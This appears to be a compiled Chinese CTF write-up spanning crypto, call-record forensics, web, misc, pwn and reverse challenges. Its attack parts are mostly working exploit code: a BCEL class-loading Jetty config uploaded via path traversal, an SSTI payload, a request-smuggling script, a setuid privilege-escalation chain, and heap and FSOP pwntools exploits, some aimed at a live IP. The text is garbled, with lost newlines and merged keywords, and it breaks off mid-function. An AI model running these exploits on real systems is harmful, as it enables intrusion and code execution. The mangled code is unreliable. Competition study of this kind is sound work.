enc= bytes.fromhex(enc)flag = bytes(m ^ next(gen) for m in enc)print(flag)#b'Happy4321: flag{The_matrix_is_as_charming_as_the_starry_sky}'

大数据

1.和嫌疑人170****5678 通话次数最多的对方号码是哪一个？【例：flag{170****5678}】

flag{133****0181}

2.请问和已知的 6 位嫌疑人都有过通话关系的对方号码有哪些？【若有多个号码，手机号码之间用”-“连接，并将号码由小至大列出，例：flag{170****5678-170****5678-170****5678…}

flag{158****6074}

3.请问和已知的 6 位嫌疑人中任意 3 位及以上有过通话关系且通话总时长大于 10000 秒的对方号码有哪些？【若有多个号码，手机号码之间用”-“连接，并将号码由小至大列出，例：flag{170****5678-170****5678-170****5678…}】

133****0181

158****6074

181****2233

167****2333

130****0330

‍4.请问 138****7383 在 2021-12-01（含当天）之后新增的通话对方号码有哪些？（填写手机号）【若有多个号码，手机号码之间用”-“连接，并将号码由小至大列出，例：flag{170****5678-170****5678-170****5678…}】

137****5632

130****9357

139****2928

183****5333


```
未过滤.user.ini文件
试用.user.ini文件进行包含，但是过滤了`<?`和`php`
所以可以尝试进行包含日志文件`/var/log/nginx/access.log`auto_prepend_file=/var/log/nginx/access.log然后在UA头写马
import requestsfrom io import BytesIO
upload_url = "http://175.27.229.115:
16345/flag.php?keyword=<svg onload=alert()>"
files = {}for i in range(1, 22):    filename = f'file{i}.txt'    content = f'这是第{i}个文件'.encode('utf-8')    files[f'file{i}'] = (filename, BytesIO(content))
response = requests.post(upload_url, files=files)

if response.ok:    html = response.text    print(html)    with open('response.html', 'w', encoding='utf-8') as f:        f.write(html)    print('上传成功，响应保存到 response.html')else:    print('上传失败，状态码:', response.status_code)
/a/b/..%00/WEB-INF/web.xml/.%00/WEB-INF/web.xml
private boolean isValidUser(String username, String password){try (BufferedReader reader = new BufferedReader(new FileReader("/var/lib/jetty/webapps/root/"+FILE_NAME))) {        String line;while ((line = reader.readLine()) != null) {            String[] parts = line.split("_");if (parts.length == 2 && parts[0].equals(username) && parts[1].equals(password)) {returntrue;            }        }    } catch (IOException e) {        e.printStackTrace();    }returnfalse;}
/%u002e/WEB-INF/lib
<?xml version="1.0"?><!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN""http://www.eclipse.org/jetty/configure_9_3.dtd"><Configure class="org.eclipse.jetty.server.handler.ContextHandler">    <Newid="foo" class="com.sun.org.apache.bcel.internal.util.ClassLoader"></New>
    <Refrefid="foo">        <Callid="test1" name="loadClass">            <Arg>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Rko$d2$60$U$7e$5e$60$U$Y$b8$8d$c96$e7$8d$cd$cb$40$c1F$r$s$86$cdd$99l$99$b6L$85$a0$f8$edmy$85riI$v$e32$f7$7b$fc$bc$_j4$d1$ef$fe$u$e3iG$90d$s6$e9$b9$3c$e7$3c$cf99$ed$af$df$df$7e$A$c8$n$VA$Yk$R$5c$c1z$IW$5d$7fM$c2u$J7$o$I$e2$a6$84$a4$84$N$86$e0$b6a$g$ce3$G$7f$w$5da$I$ecY5$c1$b0$a0$Y$a6$u$f6$3b$9a$b0$cb$5ck$T$SW$y$9d$b7$x$dc6$dc$7c$C$G$9c$86$d1c$d8T$y$bb$$$8b$n$eft$dbB$d6t$d1$7e$q$d7D$c7$ea$c9$D$a1$c9D$d3$f3$M$a1m$bd$3d$Z$c5$88$9aP$9a$fc$98$cb$86$r$l$k$V$86$ba$e8$3a$86eR$5b$ac$e4p$bd$a5$f2$ae7$82$Wf$88$94$ac$be$ad$8b$7d$c3$j$Zv$e5$k$b8$dc$u$o$98$97$b0$Z$c5$z$dcf$e0$g$ef5$92Y$3dy$o$f4$86$95$a9v$f6$c7$7co$d7$e1$a5$dd$fb$_$8c$a7$ad$f7$ef$aa$c7$b5$83$e2$40$Z$X$k$XK$b9Qq$94$h$a9$cdV_$z$X$k$w$e3$c3$b1$3aV$eb$ea$f3$5cG$7d$bd$b3s$fa$f1$84$c4$c4$93$5c$s$5b$3b$8f$h$99$acq$g$c5$j$dceX$fe$c7$e2$M$eb$k$da$e6f$5d$7e$d37$j$a3$p$a6Ew$d1$z$86$e4$ff$8e$c4$b0$f8W$e4Hk$K$ddaX$ba$a0K$H$a9$Lg$9a$qRi$e5B$P$j2$m$86$82$q$b7R3$d5$92c$hf$3d$3fKxe$5b$ba$e8$f5$88$b06$dbYn$d8$d6$c0$fd$C$f9t$F$h$I$d1$af$e4$3e$3e0$f7$ead$a3$94$c9$e4$Z$f9$b9$7b_$c0$ce$bcr$8cl$f0$i$c4$r$b2$d1I$bc$80E$f2$n$yM$c9$l$e0$f7j$ab_$e1$8b$fb$3f$p$f0$f6$Tb$_$bf$pX$r5$e9$e7$99W$MS$eb$i5$ba$b2$x$U$c1$dbd$9e$d00a$R$c2$a2$d311$c2$e2X$a6$ec2$bd$S$7c$8a$84D$98$K$x$def$ab$7f$AS$db$d2$3c$Z$D$A$A</Arg>        </Call>    </Ref>
    <Refrefid="test1">        <Callname="newInstance"></Call>    </Ref>
</Configure>
POST /fileload HTTP/1.1Host: 192.168.0.113:
32774Content-Length: 2063Cache-Control: max-age=0Origin: http://192.168.0.113:
32774Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzYxpwivCpwppICh2Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://192.168.0.113:
32774/fileloadAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=node0o531w85xhhl76uitrqzmvxrh1.node0Connection: keep-alive
------WebKitFormBoundaryzYxpwivCpwppICh2Content-Disposition: form-data; name="filename"; filename="../exp.xml"Content-Type: text/xml
<?xml version="1.0"?><!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN""http://www.eclipse.org/jetty/configure_9_3.dtd"><Configure class="org.eclipse.jetty.server.handler.ContextHandler">    <Newid="foo" class="com.sun.org.apache.bcel.internal.util.ClassLoader"></New>
    <Refrefid="foo">        <Callid="test1" name="loadClass">            <Arg>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Rko$d2$60$U$7e$5e$60$U$Y$b8$8d$c96$e7$8d$cd$cb$40$c1F$r$s$86$cdd$99l$99$b6L$85$a0$f8$edmy$85riI$v$e32$f7$7b$fc$bc$_j4$d1$ef$fe$u$e3iG$90d$s6$e9$b9$3c$e7$3c$cf99$ed$af$df$df$7e$A$c8$n$VA$Yk$R$5c$c1z$IW$5d$7fM$c2u$J7$o$I$e2$a6$84$a4$84$N$86$e0$b6a$g$ce3$G$7f$w$5da$I$ecY5$c1$b0$a0$Y$a6$u$f6$3b$9a$b0$cb$5ck$T$SW$y$9d$b7$x$dc6$dc$7c$C$G$9c$86$d1c$d8T$y$bb$$$8b$n$eft$dbB$d6t$d1$7e$q$d7D$c7$ea$c9$D$a1$c9D$d3$f3$M$a1m$bd$3d$Z$c5$88$9aP$9a$fc$98$cb$86$r$l$k$V$86$ba$e8$3a$86eR$5b$ac$e4p$bd$a5$f2$ae7$82$Wf$88$94$ac$be$ad$8b$7d$c3$j$Zv$e5$k$b8$dc$u$o$98$97$b0$Z$c5$z$dcf$e0$g$ef5$92Y$3dy$o$f4$86$95$a9v$f6$c7$7co$d7$e1$a5$dd$fb$_$8c$a7$ad$f7$ef$aa$c7$b5$83$e2$40$Z$X$k$XK$b9Qq$94$h$a9$cdV_$z$X$k$w$e3$c3$b1$3aV$eb$ea$f3$5cG$7d$bd$b3s$fa$f1$84$c4$c4$93$5c$s$5b$3b$8f$h$99$acq$g$c5$j$dceX$fe$c7$e2$M$eb$k$da$e6f$5d$7e$d37$j$a3$p$a6Ew$d1$z$86$e4$ff$8e$c4$b0$f8W$e4Hk$K$ddaX$ba$a0K$H$a9$Lg$9a$qRi$e5B$P$j2$m$86$82$q$b7R3$d5$92c$hf$3d$3fKxe$5b$ba$e8$f5$88$b06$dbYn$d8$d6$c0$fd$C$f9t$F$h$I$d1$af$e4$3e$3e0$f7$ead$a3$94$c9$e4$Z$f9$b9$7b_$c0$ce$bcr$8cl$f0$i$c4$r$b2$d1I$bc$80E$f2$n$yM$c9$l$e0$f7j$ab_$e1$8b$fb$3f$p$f0$f6$Tb$_$bf$pX$r5$e9$e7$99W$MS$eb$i5$ba$b2$x$U$c1$dbd$9e$d00a$R$c2$a2$d311$c2$e2X$a6$ec2$bd$S$7c$8a$84D$98$K$x$def$ab$7f$AS$db$d2$3c$Z$D$A$A</Arg>        </Call>    </Ref>
    <Refrefid="test1">        <Callname="newInstance"></Call>    </Ref>
</Configure>------WebKitFormBoundaryzYxpwivCpwppICh2Content-Disposition: form-data; name="submit"Upload------WebKitFormBoundaryzYxpwivCpwppICh2--
getcap -r / 2>/dev/null
echo "I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9" |base64 -d >/var/lib/jetty/webapps/root/SetUID.cecho "cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvZmxsYWc+L3Zhci9saWIvamV0dHkvd2ViYXBwcy9yb290LzEudHh0In0pOwogICAgfQp9" |base64 -d >/var/lib/jetty/webapps/root/SetUID.javagcc -shared -fPIC -o /var/lib/jetty/webapps/root/libSetUID.so -I${JAVA_HOME}/include -I${JAVA_HOME}/include/linux /var/lib/jetty/webapps/root/SetUID.cjavac /var/lib/jetty/webapps/root/SetUID.javajava -Djava.library.path=/var/lib/jetty/webapps/root/ -cp /var/lib/jetty/webapps/root/ SetUID
{{url_for["__globals__"].__builtins__['exec']("current_app.jinja_env.filters['capitalize'] = lambda filename: open('/flag', 'r').read()",url_for["__globals__"])}}
import socketimport requestsimport sysimport re
ip = str(sys.argv[1])payload = 'title=aa&author={{url_for["__globals__"].__builtins__['exec']("current_app.jinja_env.filters['capitalize'] = lambda filename: open('/flag', 'r').read()",url_for["__globals__"])}}'exp3 = f'''{payload}r'''exp3_len = len(exp3) - 4
# print(exp3_len)
exp2 = f'''xxxxxxxxPOST /add_book HTTP/1.1rHost: localhostrContent-Length:{exp3_len}rContent-Type: application/x-www-form-urlencodedrr'''
exp2_len = len(exp2 + f"{payload}")
# print(exp2_len)
exp1 = f'''GET / HTTP/1.1rHost: localhostrContent-Length: {exp2_len}rSec-Websocket-Key1: xrr'''
final_payload = exp1 + exp2 + exp3
# print(final_payload)final_payload = final_payload.encode()
sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sSocket.connect((ip, 9999))

def send(payload):    #    print(payload)    sSocket.send(payload)    sSocket.settimeout(2)    response = sSocket.recv(2147483647)    while len(response) > 0:        #        print(response.decode())        try:            response = sSocket.recv(2147483647)        
except:            break    sSocket.close()

if __name__ == '__main__':    send(final_payload)    req = requests.get(url=f"http://{ip}:
9999/details/4",)
    match = re.search(r'flag{[^{}]*}', req.text)    if match:        print(match.group())    else:        print("Please restart docker and try again.")
OBUWGOTZGB2TI4RTNAZXEMApic:
y0u4r3h3r
from PIL import Imageimport numpy as npdef is_black(pixel, threshold=30):  """检查像素是否接近黑色（RGB值均<=threshold）"""  if len(pixel) >= 3: # RGB或RGBA模式    r, g, b = pixel[:3]    return r <= threshold and g <= threshold and b <= threshold  return Falsedef extract_rightmost_columns(image_path, threshold=30):  # 打开图片  img = Image.open(image_path)  img_array = np.array(img)  second_last_col = img_array[:, -2] # 倒数第二列  last_col = img_array[:, -1] # 最后一列  result = []  for i in range(img_array.shape[0]): # 遍历所有行  # 检查是否为接近黑色的像素    second_last_black = is_black(second_last_col[i], threshold)    last_black = is_black(last_col[i], threshold)    if last_black:      result.append('1')    elif second_last_black:      result.append('0')  return ''.join(result)if __name__ == "__main__":  image_path = r""  try:    result = extract_rightmost_columns(image_path, threshold=30)    print("提取结果:", result)    print("结果长度:", len(result))  
except Exception as e:    print("处理出错:", str(e))
提取结果:
00110011001101100011000010110011101111011011110010011000001110101010111110011010001110010001100110101111101110010001100110011010001101100010111110111010001101000001100110101111100110100011011000011001101110010001000010010000101111101结果长度: 233
解压压缩包，有加密葵花宝典，一张数独，一个数学天才txt
从数学天才txt中得到信息，解压葵花宝典的密码是数独斜下对角线的数字，而且结合试炼二可以知道要去4换$(这一步本意是防止数独直接被爆破，没想到替换之后依旧可以很快的爆破，被非预期了)
解数独的方法有很多种，这里列举几种：
1. 较慢方法：喂给AI，直接让他解(难度略大，需要合适的提问技巧)
2. 普通方法：从AI得知该数独的名称为Killer Sudoku，于是转为寻找解密脚本(从github中)或网站(https://www.sudokuwiki.org/KillerSudoku.aspx)3. 数学天才：真正的数学天才不需要花里胡哨的操作，直接手搓(数学比较好的一般10min以内就ok)
4. Misc天才：发现可以爆破出密码，使用自定义字符集123$56789爆破即可(仅需10s)
以上方法均可得到密码295$25$23,解压葵花宝典，发现flag被加密了，试炼三则提示60，可以联想到使用rot47和rot13加密，依次解密即可
下载附件，解压缩，是一个图片小小挑战.png，010editor打开可以发现图片后面隐藏的数据，手动提取或binwalk分离，可以得到一个压缩包，解压压缩包发现加密的flag.zip和一张图片2.png
利用脚本异或，或者使用Stegsolve/随波逐流，即可得到一张二维码，是datamatrix码，使用
https://online-barcode-reader.inliteresearch.com/
扫码得到
<E:8E?W^Z<=tEZ)=lP6n>;.Tg>q@+!/6=B)/6_%hLg*.rH<gLN
base85解码得到UV!W_X_YZ,U,Y∈[0,9], V,W,X,Z∈[A,z]
推测为密码规则，使用ziperello，利用该规则掩码爆破flag.zip,得到密码9h!Y_a_8D
import requestsfrom pwn import *from requests.auth import *import ctypesfrom ctypes import *from structimportpackcontext.log_level='debug'context(os='linux', arch='amd64')io = process('./pwn')elf = ELF('./pwn')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#libcc = cdll.LoadLibrary('./libc.so.6')#libcc.srand(libcc.time(0))def duan():  gdb.attach(io)  pause()context.terminal = ['gnome-terminal','-x','sh','-c'] 
def add(ind,size,content):    io.recv()    io.sendline(str(1))    io.recv()    io.sendline(str(ind))    io.recv()    io.sendline(str(size))    io.recv()    io.sendline(content)
def free(idx):    io.recv()     io.sendline(str(3))    io.recv()    io.sendline(str(idx))def show(idx):    io.recv()    io.sendline(str(2))    io.recv()    io.sendline(str(idx))  def uaf(idx):    io.recv()    io.sendline(str(321))    io.recv()    io.sendline(str(idx))add(0,0x80,b'a')
add(1,0x80,b'a')add(2,0x80,b'a')add(3,0x80,b'a')
add(4,0x80,b'aaaaaaaa')add(5,0x80,b'aaaaaaaa')add(6,0x80,b'aaaaaaaa')add(7,0x80,b'aaaaaaaa')add(8,0x80,b'aaaaaaaa')add(9,0x10,b'/bin/shx00')free(0)free(1)free(2)free(3)free(4)free(5)free(6)uaf(8)free(7)show(8)libc_base = u64(io.recvuntil("x7f")[-6:].ljust(8,b"x00"))-0x1ecbe0print('libc',hex(libc_base))free_hook = libc_base + libc.sym['__free_hook']malloc_hook = libc_base + libc.sym['__malloc_hook']sys = libc_base + libc.symbols['system']add(10,0x80,b'cccccccc')free(8)payload = b'd'*0x80+p64(0)+p64(0x91)+p64(free_hook)add(11,0xa0,payload)add(12,0x80,b'a')add(8,0x80,p64(sys))free(9)io.interactive()
import requestsfrom pwn import *from requests.auth import *import ctypesfrom ctypes import *from structimportpackcontext.log_level='debug'context(os='linux', arch='amd64')context.terminal = ['gnome-terminal','-x','sh','-c'] def duan():    gdb.attach(io)    pause()
io = process('./pwn')
# io = remote('0.0.0.0', 9999)elf = ELF('./pwn')libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def add(size):    io.sendlineafter(b"choice: n", b'1')    io.sendlineafter(b"size:n", str(size).encode())def free(index):    io.sendlineafter(b"choice: n", b'2')    io.sendlineafter(b":n", str(index).encode())def deposit(index, data):    io.sendlineafter(b"choice: n", b'3')    io.sendlineafter(b":n", str(index).encode())    io.sendafter(b":n", data)def remove(index, data):    io.sendlineafter(b"choice: n", b'4')    io.sendlineafter(b":n", str(index).encode())    io.sendafter(b":n", data)def show(index):    io.sendlineafter(b"choice: n", b'5')    io.sendlineafter(b":n", str(index).encode())io.sendlineafter(b"name:n", b'a')add(0x410)  # 0add(0x1f0)  # 1add(0x1f0)  # 2free(0)add(0x1f0)  # 0show(0)libc_base = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) - 0x1ecfd0environ = libc_base + libc.sym["environ"]success("libc_base: " + hex(libc_base))success("environ: " + hex(environ))free(2)remove(1, b'2272')add(0x1f0) add(0x1f0) deposit(2, p16(1) * 16 + p64(0) * 26 + p64(environ))add(0xf0) show(3)#duan()stack_addr = u64(io.recvuntil(b'x7f')[-6:].ljust(8, b'x00')) -0x120deposit(2, p16(1) * 16 + p64(0) * 26 + p64(stack_addr))pop_rax = libc_base +  0x36174pop_rdi = libc_base + 0x23b6apop_rsi = libc_base + 0x2601fpop_rdx = libc_base + 0x119431syscall = libc_base + 0x630a9ret = libc_base + 0x9aasuccess("syscall: " + hex(syscall))orw = p64(pop_rax) + p64(2)orw += p64(pop_rax) + p64(2)orw += p64(pop_rdi) + p64(stack_addr + 0xc0)orw += p64(pop_rsi) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(0)orw += p64(pop_rdi) + p64(3)orw += p64(pop_rsi) + p64(stack_addr + 0x100)orw += p64(pop_rdx) + p64(0x50) + p64(0)orw += p64(syscall)orw += p64(pop_rax) + p64(1)orw += p64(pop_rdi) + p64(1)orw += p64(syscall)orw += b'./flagx00x00'add(0xf0)  # 4deposit(4, orw)io.interactive()
from pwn import *context(os = 'linux',log_level = "debug",arch = 'amd64')io = remote("175.27.229.115",7470)#io = process("./pwn")elf = ELF("./pwn")context(os='linux', arch='amd64')

def debug():    gdb.attach(io,'b *$rebase(0x18b5)')    pause()
io.recvuntil(b'fish:')sc1 = """   lea rsp, [rip + 0]      mov rax,10   lea rdi, [rip - 0x45]      mov rsi,0x1000   mov rdx,7   syscall      push 0x67616c66   mov rdi, rsp   mov rax, 2   mov byte ptr [rip],0x0f"""
sc2 = '''   push 1   pop rdi   push 3   pop rsi   push 0   pop rdx   mov r10, 0x100   push 40   pop rax   mov byte ptr [rip],0x0f'''#debug()
pay = b'x00' * 0x30 + asm(sc1) + b'x90x05' + asm(sc2) + b'x90x05'
print(len(pay))io.send(pay)
io.interactive()
from pwn import *  context(os='linux', arch='amd64', log_level='debug')  #r = process('./pwn') r = remote('175.27.229.115',7770)  libc = ELF("./libc-2.23.so")  elf = ELF('./pwn') def dbg():    gdb.attach(r,'b *$rebase(0xb37)')    pause()    def cmd(choice):    r.recvuntil(b'choice:')    r.sendline(str(choice).encode())def add(size,cont):    cmd(1)     r.recvuntil(b'Size:')    r.sendline(str(size))    r.recvuntil(b'Content:')    r.send(cont)def delete(idx):    cmd(2)    r.recvuntil(b'Index:')    r.sendline(str(idx).encode())def edit(idx,content):    cmd(3)    r.recvuntil(b'Index:')    r.sendline(str(idx).encode())    r.recvuntil(b'Content:')    r.send(content)def printf(idx):    cmd(4)    r.recvuntil(b'Index:')    r.sendline(str(idx).encode())
def exit():    cmd(113023)
add(0xf8,b'aaaa')  #  0add(0x468,b'bbbb')  # 1add(0xf8,b'cccc')
#    2add(0x18,b'eeee') #   3add(0x550,b'dddd')
#   4add(0x10,b'protect') #prevent chunk   5delete(0) edit(1,b'x00'*0x460 + p64(0x470 + 0x100))delete(2)add(0xf8,b'aaaa')add(0xb00,b'rrrr') printf(1)r.recvuntil(b'nt:n')large =  u64(r.recv(6).ljust(8, b' '))libc_base = large - 0x3c4fb8success('libc_base:' +hex(libc_base)) _IO_list_all = libc_base + libc.sym['_IO_list_all']io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']system = libc_base + libc.sym['system']edit(1,b'a'*0x10 + b'b') printf(1)r.recvuntil(b'aaaaaaaaaaaaaaaa')chunk_addr =  u64(r.recv(6).ljust(8, b' ')) -0x62success('chunk_addr:' +hex(chunk_addr))
delete(4) edit(1,p64(large) + p64(large) + p64(0) + p64(_IO_list_all-0x20))add(0x1000,b'large2')#4 -- > largeedit(0,b'A' * 0xf0 + p32(0xfffff7f5) + b';shx00')fake_io_file = p64(0)*2 + p64(1) + p64(2)fake_io_file = fake_io_file.ljust(    0xa0 - 0x10, b' ') + p64(chunk_addr + 0x100)  # _wide_datafake_io_file = fake_io_file.ljust(    0xc0 - 0x10, b' ') + p64(0xffffffffffffffff)  # _modefake_io_file = fake_io_file.ljust(    0xd8 - 0x10, b' ') + p64(io_wfile_jumps)  # vtablefake_io_file = fake_io_file.ljust(    0x100 - 0x10 + 0x130, b' ') + p64(chunk_addr + 0x200)fake_io_file = fake_io_file.ljust(    0x200 - 0x10, b' ') + p64(0)*6 + p64(system)add(0x550,b'tttt')edit(1,fake_io_file)exit()r.interactive()
def convert_hex_to_bin(input_file, output_file):    """    将包含十六进制字符串的文本文件转换为二进制文件    :
param input_file: 输入文本文件路径    :
param output_file: 输出二进制文件路径    """    try:        with open(input_file, 'r') as f:            hex_str = f.read().replace('n', ' ').split()                # 将十六进制字符串转换为字节数组        byte_data = bytes.fromhex(''.join(hex_str))                with open(output_file, 'wb') as f:            f.write(byte_data)                    print(f"成功转换并写入 {len(byte_data)} 字节到 {output_file}")        
except ValueError as e:        print(f"错误：输入包含无效的十六进制字符 - {e}")    
except Exception as e:        print(f"发生错误：{e}")
if __name__ == "__main__":    input_txt = "part1flag.txt"  # 替换为你的输入文件路径    output_bin = "output.bin"  # 替换为你的输出文件路径    convert_hex_to_bin(input_txt, output_bin)
a=[88 ,47, 80 ,54 ,95 ,57, 90 ,54 ,94, 47]for i in range(len(a)):    if i%2 ==0:        a[i]^=0x31    else:        a[i]^=0x58for i in range(len(a)):    print(chr(a[i]),end='')#iwannaknow
WOo0.py:
from secret import decrypt

# 测试代码：key = bytes.fromhex("EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD")ciphertext = b"xd4z'0Lx10xcax0bx0bxaax15xbeK0"xbfxb2xc6x05"

cipher = decrypt(ciphertext,key)
a = bytes(input("flag呢"), encoding='utf-8')if a == cipher:    print('没错没错')else:    print('不对不对')
secret.py:
def key_schedule(key: bytes) -> list:    S = list(range(128))    v6 = 0    for j in range(128):        v6 = (S[j] + key[j % len(key)] + v6) % 128        v6 = (v6 ^ 55) % 128        S[j], S[v6] = S[v6], S[j]    return S
def next_byte(state: dict) -> int:    S = state['S']    state['i'] = (state['i'] + 1) % 128    state['j'] = (state['j'] + S[state['i']]) % 128    S[state['i']], S[state['j']] = S[state['j']], S[state['i']]    v2 = S[(S[state['i']] + S[state['j']]) % 128]    return ((16 * v2) | (v2 >> 4)) & 0xFF
def decrypt(ciphertext: bytes, key: bytes) -> bytes:    state = {        'S': key_schedule(key),        'i': 0,        'j': 0    }    plaintext = bytearray()    for byte in ciphertext:        plaintext.append(byte ^ next_byte(state))    return bytes(plaintext)    #what_DO_you_mean#@!
    #define _CRT_SECURE_NO_WARNINGS#include<stdio.h>#include<stdlib.h>#include<string.h>
typedefstruct{    unsignedint r1;       unsignedint r2;       unsignedint eip;      unsignedchar mem[256];        unsignedchar code[1024];  } VM;
unsignedchar code[] = {    0x20, 0x10, 0x5b,      0x20, 0x11, 0x58,      0x20, 0x12, 0x56,      0x20, 0x13, 0x6e,      0x20, 0x14, 0x11,     0x20, 0x15, 0x4e,    0x20, 0x16, 0x00,
    0x40,  // scanf("%7s", &mem[0]);
    0x11, 0x21,  // r2 = 0x21    0x10, 0x0,   // r1 = 0    0x30,        // mem[r1] ^= r2    0x10, 0x1,   // r1 = 1    0x30,    0x10, 0x2,   // r1 = 2    0x30,    0x10, 0x3,   // r1 = 3    0x30,    0x10, 0x4,   // r1 = 4    0x30,    0x10, 0x5,    0x30,    0x10, 0x6,    0x30,    0x10, 0x7,    0x30,
    0x50, 0x10, 0x7   // return memcmp(&mem[0], &mem[0x10], 7);};
VM* vm_new(){    VM* vm = (VM*)malloc(sizeof(VM));      memset(vm, 0, sizeof(VM));            memcpy(vm->code, code, sizeof(code));      return vm;}
intvm_run(VM* vm){    char opcode;    char operand_1, operand_2;
    while (1) {        opcode = vm->code[vm->eip];        switch (opcode) {        case0x10:            operand_1 = vm->code[vm->eip + 1];            vm->r1 = operand_1;            vm->eip += 2;            break;
        case0x11:            operand_1 = vm->code[vm->eip + 1];            vm->r2 = operand_1;            vm->eip += 2;            break;
        case0x20:            operand_1 = vm->code[vm->eip + 1];            operand_2 = vm->code[vm->eip + 2];            vm->mem[operand_1] = operand_2;            vm->eip += 3;            break;
        case0x30:            vm->mem[vm->r1] ^= vm->r2;            vm->eip += 1;            break;
        case0x40:            scanf("%7s", &vm->mem[0]);            vm->eip += 1;            break;
        case0x50:            operand_1 = vm->code[vm->eip + 1];            operand_2 = vm->code[vm->eip + 2];            returnmemcmp(&vm->mem[0], &vm->mem[operand_1], operand_2);        }    }}
intmain(){    printf("input sth...n");    VM* vm = vm_new();    if (!vm_run(vm))        printf("Ez right?!  flag is flag{md5(your_input)}n");//flag{ccd5cace2d47f2fc8b3a7c632f5f7b49}    else        printf("Noooon");}
fn crypt(ciphertext: &[u8], key: &[u8]) -> Vec {    let mut s: Vec = (0..=255).collect();    let key_len = key.len();    let mut j = 0u16;
    // Initialize S-box    for i in 0..256 {        let key_byte = key[i % key_len] ^ 0x66;        j = (j + s[i] as u16 + key_byte as u16) % 256;        s.swap(i, j as usize);    }
    // Generate keystream and process ciphertext    let (mut i, mut j) = (0u16, 0u16);    ciphertext        .iter()        .map(|&byte| {            i = (i + 1) % 256;            j = (j + s[i as usize] as u16) % 256;            s.swap(i as usize, j as usize);                        let k = s[((s[i as usize] as u16 + s[j as usize] as u16) % 256) as usize];            let k_rot = (k << 4) | (k >> 4);            (byte ^ (k_rot).wrapping_add(1)).wrapping_add(1)        })        .collect()}
fn main(){    println!("input your flag:");    let mut input = String::
new();    std::io::
stdin().read_line(&mut input);    let data = input.trim().as_bytes();
    // Process key (xor with index)    let mut key = vec![108u8, 110, 116, 102, 118, 112, 117, 115];    for i in 0..key.len() {        key[i] ^= i as u8;    }
    // Encrypt and check    let enc = crypt(data, &key);    let expected = vec![        0x29, 0x5, 0x13, 0xc, 0xe7, 0xa5, 0xd2, 0xa2, 0xa4, 0x3a, 0x3a, 0x5a, 0xbb, 0x23, 0x9c, 0xe4, 0xd7, 0x2, 0xbf    ];
    if enc == expected {        println!("right!!!");    } else {        println!("wrong...");    }}
def crypt(ciphertext: bytes, key: list[int]) -> list[int]:    s = list(range(256))    j = 0
    for i in range(256):        key_byte = key[i % len(key)] ^ 0x66        j = (j + s[i] + key_byte) % 256        s[i], s[j] = s[j], s[i]
    i = 0    j = 0    result = []
    for byte in ciphertext:        i = (i + 1) % 256        j = (j + s[i]) % 256        s[i], s[j] = s[j], s[i]
        k = s[(s[i] + s[j]) % 256]        k_rot = ((k << 4) & 0xFF) | (k >> 4)        cipher_byte = (byte - 1) ^ (k_rot + 1)        cipher_byte &= 0xFF        result.append(cipher_byte)
    return result
key = [108, 110, 116, 102, 118, 112, 117, 115]for i in range(len(key)):    key[i] ^= idata = [0x29, 0x05, 0x13, 0x0c, 0xe7, 0xa5, 0xd2, 0xa2, 0xa4, 0x3a, 0x3a, 0x5a, 0xbb, 0x23, 0x9c, 0xe4, 0xd7, 0x02, 0xbf]enc = crypt(data, key)print(bytes(enc))#Y0uKn0wRu5tV@ryW@1l
    #include<cstdint>#include<Windows.h>
uint8_trol(uint8_t v, int n){    return ((v << n) | (v >> (8 - n))) & 0xFF;}
uint64_tenc1(char* plain){    int i = 0;    uint64_t ret = 0;    uint8_t tmp1, tmp2;    uint8_t parts[8] = { 0 };    memcpy(parts, plain, 8);
    while (i < 4) {        tmp1 = parts[i] ^ parts[i + 2];        parts[i] = tmp1;        tmp2 = tmp1 ^ parts[i + 2] ^ parts[i + 1];        parts[i + 1] = tmp2;        parts[i + 2] ^= tmp2;        i += 3;    }
    for (int i = 0; i < 8; i++)        ret |= (uint64_t)parts[i] << ((7 - i) * 8);    return ret;}
uint64_tenc2(uint64_t plain){    int64_t tmp = plain;    for (int i = 0; i < 64; i++)    {        if (tmp < 0)            tmp = (2 * tmp) ^ 0x2EF20D07161E85F7;        else            tmp *= 2;    }    return tmp;}
uint64_tenc3(uint64_t plain){    uint8_t parts[8] = { 0 };    uint8_t result[8] = { 0 };    uint64_t ret = 0;
    for (int i = 0; i < 8; i++)        parts[i] = (plain >> i * 8) & 0xFF;
